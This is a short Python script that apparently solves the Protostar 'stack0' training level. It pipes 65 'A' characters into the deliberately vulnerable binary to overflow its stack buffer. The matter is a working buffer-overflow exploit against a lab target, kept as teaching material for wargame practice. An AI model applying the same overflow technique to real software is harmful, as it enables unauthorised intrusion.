import subprocess

path = '/opt/protostar/bin/stack0'

p = subprocess.Popen(path, stdin=subprocess.PIPE, shell=True)
p.stdin.write('A'*65)  #this line is the solution
p.stdin.flush()
stdout, stderr = p.communicate()
